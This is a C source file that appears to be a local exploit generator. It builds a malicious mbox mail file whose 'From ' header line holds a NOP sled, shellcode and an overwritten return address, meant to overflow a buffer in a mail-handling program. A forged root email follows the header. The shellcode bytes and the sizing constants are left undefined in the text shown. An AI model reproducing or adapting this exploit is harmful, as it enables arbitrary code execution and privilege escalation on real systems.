#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int LEN ; 
 int /*<<< orphan*/  NOP ; 
 long RET ; 
 long atoi (char*) ; 
 char* code ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fclose (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * fopen (char*,char*) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  fputs (char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  free (char*) ; 
 char getopt (int,char**,char*) ; 
 char* malloc (int) ; 
 char* optarg ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/ * stdout ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 
 int strlen (char*) ; 

int main(int argc, char **argv) {
  int i = 0, offset = 0;
  char ch, *mfile = NULL, *p = NULL, buf[5 + LEN + 6 + 2 + 3 + 1 + 3 + 2 + 1 + 8 + 1 + 4 + 2];  // From %s@foo.bar  Thu Jun 26 16:45:16 2003\n\0
  long ret = RET, *paddr = NULL;
  FILE *fd;
  
  if(argc < 2) {
    fprintf(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
    exit(1);
  }

  while((ch = getopt(argc, argv, "m:o:h")) != -1) {
    switch(ch) {
      case 'h':
        fprintf(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
        exit(1);
      break;

      case 'o':
        ret -= atoi(optarg);
      break;

      case 'm':
        if(!(mfile = malloc(strlen(optarg)+1))) {
          perror("malloc");
          exit(1);
        }
        strcpy(mfile, optarg);
      break; 
    }
  }

  if(!mfile) {
    fprintf(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
    exit(1);
  }

  fprintf(stderr, "[+] ret 0x%lx\n", ret);

  strcpy(buf, "From ");
  p = buf + 5;

  // nops
  for(i=0; i<LEN-strlen(code)-4; i++)
    *(p++) = NOP;

  // shellcode
  for(i=0; i<strlen(code); i++)
    *(p++) = code[i];

  // address
  paddr = (long *)p;
  for(i=0; i<4; i+=4)
    *(paddr++) = ret;

  // terminate and concatenate
  *(p+4) = 0;
  strcat(buf, "@foo.bar  Thu Jun 26 16:45:16 2003\n");
  
  // check for an outfile, otherwise send to stdout
  if(mfile) {
    if(!(fd = fopen(mfile, "a"))) {
      perror("fopen");
      exit(1);
    }
    fprintf(stderr, "[+] out %s\n", mfile);
  } else {
    fd = stdout;
    fprintf(stderr, "[+] out stdout\n");
  }

  fputs(buf, fd); 
  fputs("Return-Path: <root@foo.bar>\n", fd);
  fputs("Received: from localhost (localhost [127.0.0.1])", fd);
  fputs("\tby localhost (8.12.4/8.12.4) with ESMTP id h5QNPG2q003945\n", fd);
  fputs("\tfor <root@foo.bar>; Thu, 26 Jun 2003 16:45:16 -0700\n", fd);
  fputs("Received: (from root@foo.bar)\n", fd);
  fputs("\tby localhost (8.12.4/8.12.4/Submit) id h5QNPGuc004172\n", fd);
  fputs("\tfor root; Thu, 26 Jun 2003 16:45:16 -0700\n", fd);
  fputs("Date: Thu, 26 Jun 2003 16:45:12 -0700\n", fd);
  fputs("From: root@foo.bar\n", fd);
  fputs("Message-Id: <200306262325.h5QNPGuc003744@localhost>\n", fd);
  fputs("To: root@foo.bar\n", fd);
  fputs("Subject: foobar\n\n", fd);
  fputs("foobar\n\n", fd);

  fclose(fd);
  free(mfile);
  exit(0);
}